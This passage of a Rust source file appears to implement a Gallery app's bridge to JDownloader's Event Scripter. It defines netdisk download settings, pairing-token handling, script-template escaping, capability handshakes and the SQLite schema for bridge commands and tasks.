use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};

use anyhow::{anyhow, Result};
use rusqlite::{params, Connection, OptionalExtension};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::media_roots::{path_under_authorized_roots, MediaRoots};
use crate::pawchive::{record_external_receipt, ExternalBridge, ExternalReceipt, ReceiptOutcome};

pub const KEY_NETDISK_ENABLED: &str = "netdisk_enabled";
pub const KEY_NETDISK_AUTO_START: &str = "netdisk_auto_start";
pub const KEY_NETDISK_AUTO_IMPORT: &str = "netdisk_auto_import";
pub const KEY_NETDISK_CLEANUP_AFTER_IMPORT: &str = "netdisk_cleanup_after_import";
pub const KEY_NETDISK_STAGING_DIR: &str = "netdisk_staging_dir";
pub const KEY_NETDISK_IMPORT_DIR: &str = "netdisk_import_dir";
pub const KEY_NETDISK_CHECK_INTERVAL_SECS: &str = "netdisk_check_interval_secs";
pub const KEY_NETDISK_RESERVE_SPACE_GIB: &str = "netdisk_reserve_space_gib";
pub const KEY_NETDISK_BRIDGE_TOKEN_HASH: &str = "netdisk_bridge_token_hash";
// Private pairing material, never included in settings/status responses.
const KEY_NETDISK_BRIDGE_TOKEN: &str = "netdisk_bridge_token";
/// Set by the explicit "断开连接" action. While it is set the bridge exchange is
/// refused, so a disconnected install cannot keep reporting progress it is no
/// longer tracking.
pub const KEY_NETDISK_DISCONNECTED: &str = "netdisk_disconnected";

/// The bridge protocol this build speaks. The generated script carries the same
/// value, and a script that reports a different one is not trusted for the
/// capabilities this version relies on.
pub const NETDISK_PROTOCOL_VERSION: &str = "2";
pub const NETDISK_SCRIPT_VERSION: &str = "2.3";
/// Allow several missed ten-second ticks before declaring the script offline.
pub const NETDISK_HEARTBEAT_TIMEOUT_SECS: i64 = 60;

/// How many answered requests are kept per session for verbatim replay.
const BRIDGE_RESPONSE_WINDOW: i64 = 64;

/// How many times one command may be handed to the bridge before it is left
/// alone for a human. A side-effect command that keeps being re-sent without a
/// result is exactly the case the plan refuses to resolve by guessing.
const BRIDGE_COMMAND_ATTEMPT_CAP: i64 = 5;

/// Command states. `queued` has never been sent, `issued` is in flight,
/// `confirmed` has a result, and `uncertain` has been re-sent enough times that
/// Gallery must stop assuming anything about its effect.
pub const BRIDGE_COMMAND_QUEUED: &str = "queued";
pub const BRIDGE_COMMAND_ISSUED: &str = "issued";
pub const BRIDGE_COMMAND_CONFIRMED: &str = "confirmed";
pub const BRIDGE_COMMAND_UNCERTAIN: &str = "uncertain";

/// Actions whose effect cannot be undone by sending them again, so a retransmit
/// has to be recorded as uncertainty rather than as a fresh attempt.
const SIDE_EFFECT_ACTIONS: [&str; 2] = ["add_links", "remove"];

/// A request whose sequence number was already answered with different content,
/// or that contradicts the protocol. Maps to HTTP 409.
#[derive(Debug)]
pub struct BridgeConflict(pub String);

impl std::fmt::Display for BridgeConflict {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl std::error::Error for BridgeConflict {}

/// A malformed request. Maps to HTTP 400.
#[derive(Debug)]
pub struct BridgeInvalid(pub String);

impl std::fmt::Display for BridgeInvalid {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl std::error::Error for BridgeInvalid {}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(default)]
pub struct NetdiskSettings {
    pub enabled: bool,
    /// Submit a new task to the download list as soon as it is registered.
    /// Turning it off leaves the task at 待开始 until an explicit `start`.
    pub auto_start: bool,
    /// Allow a settled task to be imported without a manual confirmation. Only
    /// selectable once the installed script has passed the capability
    /// handshake, so it is refused at save time otherwise.
    pub auto_import: bool,
    /// Clean up staging files and issue remove command to the bridge after a task is fully imported.
    pub cleanup_after_import: bool,
    pub staging_dir: String,
    /// Where verified outputs are handed to the library. Optional: when empty
    /// the task's own target directory is used.
    pub import_dir: String,
    pub check_interval_secs: u64,
    pub reserve_space_gib: u64,
    pub bridge_configured: bool,
}

impl Default for NetdiskSettings {
    fn default() -> Self {
        Self {
            enabled: false,
            auto_start: true,
            auto_import: false,
            cleanup_after_import: false,
            staging_dir: String::new(),
            import_dir: String::new(),
            check_interval_secs: 10,
            reserve_space_gib: 10,
            bridge_configured: false,
        }
    }
}

/// Largest decoded bridge payload Gallery accepts.
///
/// The HTTP body limit in the route is separate and larger, because form
/// encoding inflates the payload; this one is checked after decoding so a
/// request cannot spend the parse on a body that will be refused anyway.
pub const NETDISK_BRIDGE_PAYLOAD_MAX_BYTES: usize = 256 * 1024;

/// Whether the operator explicitly disconnected the bridge.
///
/// A missing key means "connected": installs that never used the action must
/// not start out refusing their own bridge.
pub fn netdisk_is_disconnected(conn: &Connection) -> Result<bool> {
    let value: Option<String> = conn
        .query_row(
            "SELECT value FROM app_settings WHERE key = ?1",
            params![KEY_NETDISK_DISCONNECTED],
            |row| row.get(0),
        )
        .optional()?;
    Ok(value
        .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
        .unwrap_or(false))
}

/// Record the explicit disconnect/connect decision.
pub fn set_netdisk_disconnected(conn: &Connection, disconnected: bool) -> Result<()> {
    conn.execute_batch(
        "CREATE TABLE IF NOT EXISTS app_settings (
            key TEXT PRIMARY KEY,
            value TEXT NOT NULL,
            updated_at INTEGER NOT NULL
        );",
    )?;
    conn.execute(
        "INSERT INTO app_settings (key, value, updated_at) VALUES (?1, ?2, strftime('%s','now'))
         ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at",
        params![
            KEY_NETDISK_DISCONNECTED,
            if disconnected { "1" } else { "0" }
        ],
    )?;
    Ok(())
}

pub fn load_netdisk_settings(conn: &Connection) -> Result<NetdiskSettings> {
    let has_settings_table: bool = conn
        .query_row(
            "SELECT 1 FROM sqlite_master WHERE type='table' AND name='app_settings'",
            [],
            |_| Ok(true),
        )
        .optional()?
        .unwrap_or(false);

    if !has_settings_table {
        return Ok(NetdiskSettings::default());
    }

    let get_val = |key: &str| -> Result<Option<String>> {
        conn.query_row(
            "SELECT value FROM app_settings WHERE key = ?1",
            params![key],
            |r| r.get(0),
        )
        .optional()
        .map_err(Into::into)
    };

    let enabled = get_val(KEY_NETDISK_ENABLED)?
        .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
        .unwrap_or(false);

    // 自动开始 defaults to on and 下载后入库 to off; an absent key is the
    // default, not "false", because the plan's default for the first is 开启.
    let auto_start = get_val(KEY_NETDISK_AUTO_START)?
        .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
        .unwrap_or(true);

    let auto_import = get_val(KEY_NETDISK_AUTO_IMPORT)?
        .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
        .unwrap_or(false);

    let cleanup_after_import = get_val(KEY_NETDISK_CLEANUP_AFTER_IMPORT)?
        .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
        .unwrap_or(false);

    let staging_dir = get_val(KEY_NETDISK_STAGING_DIR)?.unwrap_or_default();

    let import_dir = get_val(KEY_NETDISK_IMPORT_DIR)?.unwrap_or_default();

    let check_interval_secs = get_val(KEY_NETDISK_CHECK_INTERVAL_SECS)?
        .and_then(|v| v.parse().ok())
        .unwrap_or(10)
        .clamp(5, 300);

    let reserve_space_gib = get_val(KEY_NETDISK_RESERVE_SPACE_GIB)?
        .and_then(|v| v.parse().ok())
        .unwrap_or(10)
        .max(1);

    let bridge_configured = get_val(KEY_NETDISK_BRIDGE_TOKEN_HASH)?
        .map(|v| !v.trim().is_empty())
        .unwrap_or(false);

    Ok(NetdiskSettings {
        enabled,
        auto_start,
        auto_import,
        cleanup_after_import,
        staging_dir,
        import_dir,
        check_interval_secs,
        reserve_space_gib,
        bridge_configured,
    })
}

/// Resolve the default netdisk staging directory under the primary authorized media root.
/// Defaults to `<first_media_root>/.staging`.
pub fn resolve_netdisk_staging_directory(roots: &MediaRoots) -> Option<PathBuf> {
    for real in &roots.real_paths {
        let trimmed = real.trim();
        if !trimmed.is_empty() {
            return Some(PathBuf::from(trimmed).join(".staging"));
        }
    }
    for root in &roots.roots {
        let trimmed = root.trim();
        if !trimmed.is_empty() {
            return Some(PathBuf::from(trimmed).join(".staging"));
        }
    }
    None
}

/// Ensure the default `.staging` directory exists, creating it if needed.
pub fn ensure_netdisk_staging_directory(roots: &MediaRoots) -> Result<Option<PathBuf>> {
    let Some(staging_dir) = resolve_netdisk_staging_directory(roots) else {
        return Ok(None);
    };
    if !staging_dir.exists() {
        std::fs::create_dir_all(&staging_dir)?;
    }
    Ok(Some(staging_dir))
}

pub fn save_netdisk_settings(conn: &Connection, settings: &NetdiskSettings) -> Result<()> {
    for (name, path) in [
        ("暂存目录", &settings.staging_dir),
        ("入库目录", &settings.import_dir),
    ] {
        if !path.trim().is_empty() {
            validate_download_directory(path, name)?;
        }
    }
    conn.execute_batch(
        "CREATE TABLE IF NOT EXISTS app_settings (
            key TEXT PRIMARY KEY,
            value TEXT NOT NULL,
            updated_at INTEGER NOT NULL
        );",
    )?;

    // 下载后入库 and 入库后清理 are only meaningful once the installed script has proved it can
    // report real download paths and complete snapshots. Accepting the switch
    // before that would let an import or cleanup be enabled on a bridge that cannot
    // support it.
    if settings.auto_import || settings.cleanup_after_import {
        ensure_netdisk_bridge_schema(conn)?;
        if !bridge_capabilities_trusted(conn, default_bridge_identity())? {
            let label = if settings.auto_import { "下载后入库" } else { "入库后清理" };
            return Err(anyhow!(
                "{label}需要本地下载器桥先通过能力握手，当前尚未验证"
            ));
        }
    }

    let entries = [
        (
            KEY_NETDISK_ENABLED,
            if settings.enabled { "1" } else { "0" },
        ),
        (
            KEY_NETDISK_AUTO_START,
            if settings.auto_start { "1" } else { "0" },
        ),
        (
            KEY_NETDISK_AUTO_IMPORT,
            if settings.auto_import { "1" } else { "0" },
        ),
        (
            KEY_NETDISK_CLEANUP_AFTER_IMPORT,
            if settings.cleanup_after_import { "1" } else { "0" },
        ),
        (KEY_NETDISK_STAGING_DIR, settings.staging_dir.trim()),
        (KEY_NETDISK_IMPORT_DIR, settings.import_dir.trim()),
        (
            KEY_NETDISK_CHECK_INTERVAL_SECS,
            &settings.check_interval_secs.clamp(5, 300).to_string(),
        ),
        (
            KEY_NETDISK_RESERVE_SPACE_GIB,
            &settings.reserve_space_gib.max(1).to_string(),
        ),
    ];

    for (k, v) in entries {
        conn.execute(
            "INSERT INTO app_settings (key, value, updated_at) VALUES (?1, ?2, strftime('%s','now'))
             ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at",
            params![k, v],
        )?;
    }

    Ok(())
}

fn validate_download_directory(raw: &str, label: &str) -> Result<()> {
    let raw = raw.trim();
    let path = Path::new(raw);
    if raw.is_empty()
        || (!path.is_absolute() && !raw.starts_with('/'))
        || raw.chars().any(char::is_control)
        || raw.split(['/', '\\']).any(|part| part == "..")
    {
        return Err(anyhow!(
            "{label}必须是绝对路径，且不能包含上级目录或控制字符"
        ));
    }
    Ok(())
}

/// Generate and save a new 32-byte hex pairing token for the Event Scripter bridge.
/// Keeps the pairing material for repeatable script retrieval and its verification hash.
pub fn rotate_bridge_token(conn: &Connection) -> Result<String> {
    ensure_netdisk_bridge_schema(conn)?;
    conn.execute_batch(
        "CREATE TABLE IF NOT EXISTS app_settings (
            key TEXT PRIMARY KEY,
            value TEXT NOT NULL,
            updated_at INTEGER NOT NULL
        );",
    )?;

    use std::fmt::Write;
    let mut raw_bytes = [0u8; 32];
    for b in &mut raw_bytes {
        *b = (uuid::Uuid::new_v4().as_u128() & 0xFF) as u8;
    }
    let mut token = String::with_capacity(64);
    for b in raw_bytes {
        write!(&mut token, "{:02x}", b)?;
    }

    let mut hasher = Sha256::new();
    hasher.update(token.as_bytes());
    let token_hash = format!("{:x}", hasher.finalize());

    let tx = conn.unchecked_transaction()?;
    tx.execute(
        "INSERT INTO app_settings (key, value, updated_at) VALUES (?1, ?2, strftime('%s','now'))
         ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at",
        params![KEY_NETDISK_BRIDGE_TOKEN_HASH, token_hash],
    )?;
    tx.execute(
        "INSERT INTO app_settings (key, value, updated_at) VALUES (?1, ?2, strftime('%s','now'))
         ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at",
        params![KEY_NETDISK_BRIDGE_TOKEN, token],
    )?;
    // A previous handshake cannot authenticate a newly generated script.
    tx.execute("UPDATE netdisk_bridge_sessions SET handshaked = 0", [])?;
    tx.commit()?;

    Ok(token)
}

/// Return the existing pairing material without changing sessions or credentials.
pub fn saved_bridge_token(conn: &Connection) -> Result<Option<String>> {
    let token: Option<String> = conn
        .query_row(
            "SELECT value FROM app_settings WHERE key = ?1",
            [KEY_NETDISK_BRIDGE_TOKEN],
            |row| row.get(0),
        )
        .optional()?;
    match token {
        Some(token) if verify_bridge_token(conn, &token)? => Ok(Some(token)),
        _ => Ok(None),
    }
}

/// Recover hash-only installations from an authenticated heartbeat, without re-pairing.
pub fn remember_bridge_token(conn: &Connection, token: &str) -> Result<()> {
    if !verify_bridge_token(conn, token)? {
        return Err(anyhow!("invalid bridge pairing token"));
    }
    conn.execute(
        "INSERT INTO app_settings (key, value, updated_at) VALUES (?1, ?2, strftime('%s','now'))
         ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at
         WHERE app_settings.value <> excluded.value",
        params![KEY_NETDISK_BRIDGE_TOKEN, token.trim()],
    )?;
    Ok(())
}

/// Verify whether the provided token matches the configured bridge token hash.
pub fn verify_bridge_token(conn: &Connection, provided_token: &str) -> Result<bool> {
    let token_trimmed = provided_token.trim();
    if token_trimmed.is_empty() {
        return Ok(false);
    }

    let stored_hash: Option<String> = conn
        .query_row(
            "SELECT value FROM app_settings WHERE key = ?1",
            params![KEY_NETDISK_BRIDGE_TOKEN_HASH],
            |r| r.get(0),
        )
        .optional()?;

    let Some(stored_hash) = stored_hash else {
        return Ok(false);
    };

    let mut hasher = Sha256::new();
    hasher.update(token_trimmed.as_bytes());
    let provided_hash = format!("{:x}", hasher.finalize());

    // Constant time comparison to prevent timing attacks
    let matches = stored_hash.len() == provided_hash.len()
        && stored_hash
            .bytes()
            .zip(provided_hash.bytes())
            .fold(0, |acc, (a, b)| acc | (a ^ b))
            == 0;

    Ok(matches)
}

/// The Event Scripter body. Kept as a separate source file so the JavaScript can
/// be executed by a real engine in tests instead of only pattern-matched here.
const SCRIPT_TEMPLATE: &str = include_str!("netdisk_bridge_template.js");

/// Escape a value for use inside a double-quoted JavaScript string literal.
///
/// The JSON string encoding is a subset of the JavaScript one, so reusing it
/// keeps a token or a URL from ending the literal and starting new code. The
/// surrounding quotes come from the template, so they are stripped here.
fn js_string_body(value: &str) -> String {
    let encoded = serde_json::to_string(value).unwrap_or_else(|_| "\"\"".to_string());
    encoded
        .strip_prefix('"')
        .and_then(|inner| inner.strip_suffix('"'))
        .unwrap_or("")
        .to_string()
}

/// Generate the JDownloader Event Scripter JavaScript to synchronize with Gallery.
pub fn generate_event_scripter_script(token: &str, base_url: &str) -> String {
    let clean_base = base_url.trim_end_matches('/');
    SCRIPT_TEMPLATE
        .replace("__GALLERY_BRIDGE_TOKEN__", &js_string_body(token))
        .replace(
            "__GALLERY_BRIDGE_URL__",
            &js_string_body(&format!("{clean_base}/api/netdisk/bridge/exchange")),
        )
        .replace("__GALLERY_BRIDGE_PROTOCOL__", NETDISK_PROTOCOL_VERSION)
        .replace("__GALLERY_BRIDGE_SCRIPT_VERSION__", NETDISK_SCRIPT_VERSION)
}

/// What the running script says it can do.
///
/// Reported on the handshake and stored, so Gallery never enables a capability
/// the installed script never had. A script that cannot report download paths,
/// for example, must not be allowed to settle an import.
#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq, Eq)]
#[serde(default)]
pub struct BridgeCapabilities {
    pub script_version: String,
    pub protocol_version: String,
    pub supports_commands: bool,
    pub supports_pagination: bool,
    pub supports_download_path: bool,
    pub supports_snapshot: bool,
    pub max_page_size: u32,
    /// JD's own `LINKGRABBER_AUTO_START_ENABLED`, as the script read it.
    ///
    /// `None` is "the script could not read it", which is not the same as
    /// "it is off". `moveToDownloadlist` consults that global setting, so a move
    /// performed while it is on (or while its value is unknown) starts whatever
    /// else is queued in the user's JD. The plan therefore requires a verifiable
    /// pre-check before every move, and this field is the only evidence Gallery
    /// can get: it never reads or writes JD's configuration itself.
    pub linkgrabber_auto_start_enabled: Option<bool>,
}

impl BridgeCapabilities {
    /// Whether this handshake is good enough to settle anything. An unknown or
    /// mismatched protocol version keeps the bridge in report-only mode.
    pub fn is_trusted(&self) -> bool {
        self.protocol_version == NETDISK_PROTOCOL_VERSION
            && self.supports_commands
            && self.supports_pagination
            && self.supports_download_path
            && self.supports_snapshot
    }

    /// Whether moving links in is safe with respect to JD's global auto-start.
    ///
    /// Only a reported `false` passes. Unknown counts as unsafe: the whole point
    /// of the pre-check is that a move which cannot be shown to be isolated does
    /// not happen, and a move that starts the user's other downloads is not
    /// something to discover afterwards.
    pub fn move_is_isolated(&self) -> bool {
        self.linkgrabber_auto_start_enabled == Some(false)
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BridgeExchangePayload {
    #[serde(default = "default_version")]
    pub version: String,
    #[serde(default = "default_bridge_id")]
    pub bridge_id: String,
    #[serde(default)]
    pub session_id: String,
    #[serde(default)]
    pub seq: u64,
    #[serde(default)]
    pub ack: u64,
    /// Command identities acknowledged by the bridge. This is deliberately
    /// separate from `ack`, which acknowledges the transport sequence.
    #[serde(default)]
    pub command_acks: Vec<String>,
    #[serde(default)]
    pub command_results: Vec<BridgeCommandResult>,
    #[serde(default)]
    pub capabilities: Option<BridgeCapabilities>,
    #[serde(default)]
    pub pages: Vec<BridgeSnapshotPage>,
}

impl Default for BridgeExchangePayload {
    fn default() -> Self {
        Self {
            version: default_version(),
            bridge_id: default_bridge_id(),
            session_id: String::new(),
            seq: 0,
            ack: 0,
            command_acks: Vec::new(),
            command_results: Vec::new(),
            capabilities: None,
            pages: Vec::new(),
        }
    }
}

fn default_version() -> String {
    NETDISK_PROTOCOL_VERSION.to_string()
}

fn default_bridge_id() -> String {
    "jd-local".to_string()
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct BridgeLinkStatus {
    /// JD's link UUID. Opaque text: it is never parsed as a number and never
    /// used to look up a local row.
    pub link_id: String,
    pub name: String,
    pub status: String,
    pub finished: bool,
    pub running: bool,
    pub skipped: bool,
    pub extraction_status: String,
    /// The file the transfer actually produced. Empty means unknown, and an
    /// unknown path never settles anything.
    pub download_path: String,
    pub bytes_loaded: u64,
    pub bytes_total: u64,
    pub bytes_total_verified: u64,
    /// Set by the script when JD handed back an id that JavaScript could not
    /// hold exactly. Such a record is reported, never acted on.
    pub unsafe_id: bool,
    pub error: Option<String>,
}

impl BridgeLinkStatus {
    fn is_failed(&self) -> bool {
        if self
            .error
            .as_deref()
            .map_or(false, |e| !e.trim().is_empty())
        {
            return true;
        }
        let status = self.status.to_ascii_uppercase();
        status.contains("FAIL")
            || status.contains("ERROR")
            || status.contains("OFFLINE")
            || status == "INVALID"
    }

    /// An acceptable terminal state. Deliberately not "the status text says
    /// finished": FINISHED_MIRROR means another mirror delivered the bytes, and
    /// this path may hold nothing, so it is reported but not trusted here.
    fn is_completed(&self) -> bool {
        if !self.finished {
            return false;
        }
        if self.skipped || self.running {
            return false;
        }
        let status = self.status.to_ascii_uppercase();
        if status.contains("MIRROR") {
            return false;
        }
        if status.is_empty() {
            return true;
        }
        matches!(
            status.as_str(),
            "FINISHED"
                | "FINISHED_CRC32"
                | "FINISHED_MD5"
                | "FINISHED_SHA1"
                | "FINISHED_SHA224"
                | "FINISHED_SHA256"
                | "FINISHED_SHA384"
                | "FINISHED_SHA512"
                | "FINISHED_WHIRLPOOL"
                | "SUCCESS"
                | "COMPLETED"
        )
    }

    /// JD can retain archive-specific extraction settings from previous tasks.
    /// A completed extraction does not invalidate the verified source archive;
    /// running, failed, or unknown states still block settlement.
    fn extraction_blocks_import(&self) -> bool {
        let state = self.extraction_status.to_ascii_uppercase();
        if state.is_empty() {
            return false;
        }
        !matches!(
            state.as_str(),
            "NONE" | "NOT_EXTRACTED" | "FALSE" | "0" | "SUCCESSFUL"
        )
    }
}

/// One page of one job's manifest snapshot.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct BridgeSnapshotPage {
    /// The Gallery task this page belongs to. The only identity accepted: a
    /// numeric id that happens to match a local row is not a match.
    pub job_id: String,
    /// Echoed back from the command that created the task. Zero means the
    /// script did not carry it; the frozen version on the task is then the only
    /// authority.
    pub manifest_version: i64,
    pub snapshot_id: String,
    pub page_index: u32,
    pub total_count: u32,
    pub complete: bool,
    /// The full identity set, sent once on page 0. Gallery freezes it, so a
    /// later tick that sees a different set is a changed manifest.
    pub expected: Vec<String>,
    pub records: Vec<BridgeLinkStatus>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct BridgeCommandResult {
    pub command_id: String,
    pub ok: bool,
    pub detail: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BridgeCommand {
    pub command_id: String,
    pub job_id: String,
    pub action: String,
    #[serde(default)]
    pub params: serde_json::Value,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BridgeExchangeResponse {
    pub ok: bool,
    pub ack: u64,
    pub settled_receipts: usize,
    #[serde(default)]
    pub errors: usize,
    #[serde(default)]
    pub rejected: usize,
    /// True when this response is the stored answer to an earlier request with
    /// the same session and sequence number.
    #[serde(default)]
    pub replayed: bool,
    pub commands: Vec<BridgeCommand>,
    #[serde(default)]
    pub tasks: Vec<serde_json::Value>,
}

/// A Gallery task handed to the bridge.
///
/// The task is the only thing that ties a report to a work: its identity, the
/// manifest version frozen when it was issued, and the output identity set the
/// bridge resolved. Nothing in a report is allowed to name a work directly.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BridgeTask {
    pub task_id: String,
    pub bridge_id: String,
    pub session_id: String,
    pub work_id: String,
    pub post_id: i64,
    pub manifest_version: i64,
    pub expected: Vec<String>,
    /// The share links this task was registered with. Frozen with the task, so
    /// an explicit `start` submits exactly what was reviewed rather than
    /// re-reading the artist's link list.
    pub links: Vec<String>,
    pub password: Option<String>,
    pub state: String,
}

impl BridgeTask {
    pub fn package_name(&self) -> String {
        format!("gallery-{}", self.task_id)
    }
}

/// A registered task that has not been handed to the download list yet. It is
/// the state 自动开始 off leaves a task in ("待开始").
pub const BRIDGE_TASK_REGISTERED: &str = "issued";
/// The `add_links` command for this task has been queued.
pub const BRIDGE_TASK_SUBMITTED: &str = "submitted";
/// A settled task: its receipt was accepted against the frozen manifest.
pub const BRIDGE_TASK_SETTLED: &str = "confirmed";

/// The merged state of one job's snapshot.
#[derive(Debug, Clone, Default)]
struct SnapshotState {
    complete: bool,
    records: Vec<BridgeLinkStatus>,
    /// Records whose status changed on this exchange, so a failure is reported
    /// once rather than on every tick.
    changed: Vec<BridgeLinkStatus>,
}

/// Initialize the durable tables the local bridge needs.
pub fn ensure_netdisk_bridge_schema(conn: &Connection) -> Result<()> {
    conn.execute_batch(
        r#"
        CREATE TABLE IF NOT EXISTS netdisk_bridge_commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            command_id TEXT UNIQUE NOT NULL,
            bridge_id TEXT NOT NULL,
            job_id TEXT NOT NULL,
            action TEXT NOT NULL,
            params TEXT NOT NULL DEFAULT '{}',
            status TEXT NOT NULL DEFAULT 'queued',
            attempts INTEGER NOT NULL DEFAULT 0,
            last_error TEXT NOT NULL DEFAULT '',
            created_at REAL NOT NULL,
            dispatched_at REAL,
            completed_at REAL
        );
        CREATE INDEX IF NOT EXISTS idx_netdisk_bridge_commands_bridge_status
            ON netdisk_bridge_commands(bridge_id, status);

        CREATE TABLE IF NOT EXISTS netdisk_bridge_tasks (
            task_id TEXT PRIMARY KEY,
            bridge_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            work_id TEXT NOT NULL,
            post_id INTEGER NOT NULL,
            manifest_version INTEGER NOT NULL,
            expected TEXT NOT NULL DEFAULT '[]',
            links TEXT NOT NULL DEFAULT '[]',
            password TEXT NOT NULL DEFAULT '',
            state TEXT NOT NULL DEFAULT 'issued',
            created_at REAL NOT NULL,
            updated_at REAL NOT NULL
        );
        CREATE INDEX IF NOT EXISTS idx_netdisk_bridge_tasks_bridge
            ON netdisk_bridge_tasks(bridge_id, state);

        CREATE TABLE IF NOT EXISTS netdisk_bridge_snapshots (
            bridge_id TEXT NOT NULL,
            task_id TEXT NOT NULL,
            snapshot_id TEXT NOT NULL,
            pages_seen TEXT NOT NULL DEFAULT '[]',
            records TEXT NOT NULL DEFAULT '[]',
            complete INTEGER NOT NULL DEFAULT 0,
            settled INTEGER NOT NULL DEFAULT 0,
            updated_at REAL NOT NULL,
            PRIMARY KEY (bridge_id, task_id, snapshot_id)
        );

        CREATE TABLE IF NOT EXISTS netdisk_bridge_sessions (
            bridge_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            last_seq INTEGER NOT NULL DEFAULT 0,
            last_ack INTEGER NOT NULL DEFAULT 0,
            handshaked INTEGER NOT NULL DEFAULT 0,
            capabilities TEXT NOT NULL DEFAULT '',
            created_at REAL NOT NULL,
            updated_at REAL NOT NULL,
            PRIMARY KEY (bridge_id, session_id)
        );

        CREATE TABLE IF NOT EXISTS netdisk_bridge_responses (
            bridge_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            seq INTEGER NOT NULL,
            request_digest TEXT NOT NULL,
            response_json TEXT NOT NULL,
            created_at REAL NOT NULL,
            PRIMARY KEY (bridge_id, session_id, seq)
        );
        "#,
    )?;
    ensure_bridge_task_columns(conn)?;
    crate::netdisk_import::ensure_schema(conn)?;
    normalize_bridge_command_states(conn)?;
    Ok(())
}

/// Additive column migrations for `netdisk_bridge_tasks`.
///
/// The share links were added after the table shipped, so an existing install
/// has the row without the column. `CREATE TABLE IF NOT EXISTS` cannot add it,
/// and a fresh database already has it, so this checks the table info first and
/// writes nothing when the column is present.
fn ensure_bridge_task_columns(conn: &Connection) -> Result<()> {
    let mut stmt = conn.prepare("PRAGMA table_info(netdisk_bridge_tasks)")?;
    let columns = stmt
        .query_map([], |row| row.get::<_, String>(1))?
        .collect::<rusqlite::Result<Vec<String>>>()?;
    drop(stmt);
    if !columns.iter().any(|name| name == "links") {
        conn.execute(
            "ALTER TABLE netdisk_bridge_tasks ADD COLUMN links TEXT NOT NULL DEFAULT '[]'",
            [],
        )?;
    }
    if !columns.iter().any(|name| name == "password") {
        conn.execute(
            "ALTER TABLE netdisk_bridge_tasks ADD COLUMN password TEXT NOT NULL DEFAULT ''",
            [],
        )?;
    }
    Ok(())
}

/// Map the state names this table used before the protocol gained an
/// `uncertain` state onto the current vocabulary.
///
/// Only rows that still carry an old name are touched, so a startup against an
/// already-migrated database writes nothing.
fn normalize_bridge_command_states(conn: &Connection) -> Result<()> {
    let legacy: [(&str, &str); 3] = [
        ("pending", BRIDGE_COMMAND_QUEUED),
        ("dispatched", BRIDGE_COMMAND_ISSUED),
        ("completed", BRIDGE_COMMAND_CONFIRMED),
    ];
    for (old, new) in legacy {
        conn.execute(
            "UPDATE netdisk_bridge_commands SET status = ?1 WHERE status = ?2",
            params![new, old],
        )?;
    }
    Ok(())
}

/// Enqueue a bridge command for JDownloader.
pub fn queue_bridge_command(
    conn: &Connection,
    bridge_id: &str,
    job_id: &str,
    action: &str,
    params: &serde_json::Value,
) -> Result<String> {
    ensure_netdisk_bridge_schema(conn)?;
    let command_id = format!("cmd_{}_{}", action, uuid::Uuid::new_v4().simple());
    let params_str = serde_json::to_string(params).unwrap_or_else(|_| "{}".to_string());
    conn.execute(
        "INSERT INTO netdisk_bridge_commands
         (command_id, bridge_id, job_id, action, params, status, created_at)
         VALUES (?1, ?2, ?3, ?4, ?5, 'queued', strftime('%s','now'))",
        params![command_id, bridge_id, job_id, action, params_str],
    )?;
    Ok(command_id)
}

/// Seconds since the epoch, as the `REAL` the bridge tables store.
///
/// Taken from the process clock rather than from `strftime('%s','now')`: that
/// expression returns text, and reading it back into a numeric column would
/// depend on the SQLite build's affinity rules.
fn now_secs() -> f64 {
    chrono::Utc::now().timestamp_millis() as f64 / 1000.0
}

/// Register a Gallery task with the bridge.
///
/// The manifest version is frozen here, at issue time. A report is later
/// compared against this number, so a post whose manifest moved on cannot have
/// its current version stamped onto an older delivery.
pub fn create_bridge_task(
    conn: &Connection,
    bridge_id: &str,
    session_id: &str,
    post_id: i64,
    links: &[String],
    password: Option<&str>,
) -> Result<BridgeTask> {
    ensure_netdisk_bridge_schema(conn)?;
    if bridge_id.trim().is_empty() {
        return Err(anyhow!("a bridge task needs a bridge id"));
    }
    let tx = conn.unchecked_transaction()?;
    let Some((work_id, manifest_version)) =
        crate::pawchive_pairing_write::work_of_post(&tx, post_id)?
    else {
        return Err(anyhow!("post {post_id} has no subscription identity"));
    };
    let raw_links: Option<String> = tx.query_row(
        "SELECT external_links FROM kemono_posts WHERE id=?1",
        [post_id],
        |row| row.get(0),
    )?;
    let post_links: Vec<String> = serde_json::from_str(raw_links.as_deref().unwrap_or("[]"))?;
    let effective_links: Vec<String> = if links.is_empty() {
        post_links.clone()
    } else {
        links.to_vec()
    };
    let frozen: Vec<String> = effective_links
        .iter()
        .map(|link| link.trim().to_string())
        .filter(|link| !link.is_empty())
        .collect();
    if frozen.is_empty() {
        return Err(anyhow!("作品没有可用的网盘链接"));
    }
    for link in &frozen {
        if !link.starts_with("http://") && !link.starts_with("https://") {
